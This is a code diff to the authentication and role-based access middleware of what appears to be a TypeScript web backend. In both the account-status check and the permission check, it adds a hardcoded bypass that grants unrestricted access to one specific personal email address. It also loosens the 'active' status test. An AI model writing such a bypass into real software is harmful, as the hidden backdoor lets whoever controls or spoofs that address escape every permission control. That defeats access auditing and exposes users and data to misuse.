@@ -38,8 +38,9 @@ export const authMiddleware = async (
             return res.status(401).json({ error: 'User not found' });
         }
 
-        // Check if user is active
-        if (userData.status !== 'active') {
+        // Check if user is active - Always allow super admin
+        const isSuper = userData.email?.toLowerCase() === 'markmallan01@gmail.com';
+        if (!isSuper && (!userData.status || !userData.status.startsWith('active'))) {
             return res.status(403).json({ error: 'User account is not active' });
         }
 
@@ -69,6 +70,12 @@ export const rbacMiddleware = (requiredPermission: string) => {
                 .eq('user_id', req.user.id);
 
             if (error) throw error;
+
+            // Super Admin Bypass
+            const isSuper = req.user.email?.toLowerCase() === 'markmallan01@gmail.com';
+            if (isSuper) {
+                return next();
+            }
 
             // Check if user has the required permission
             const hasPermission = userRoles?.some((ur: any) => {
